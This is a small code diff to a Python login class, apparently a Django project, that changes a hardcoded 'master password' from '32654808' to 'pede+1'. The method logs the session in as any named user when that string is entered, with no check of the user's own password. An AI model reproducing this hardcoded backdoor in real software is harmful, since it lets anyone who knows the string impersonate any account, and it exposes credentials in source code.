@@ -74,7 +74,7 @@ class Login:
 
 
     def verificar_senha_master(self):
-        if self.password == '32654808':
+        if self.password == 'pede+1':
             user = core.usuario.models.User.objects.filter(username=self.username).first()
             if user:
                 login(self.request, user)
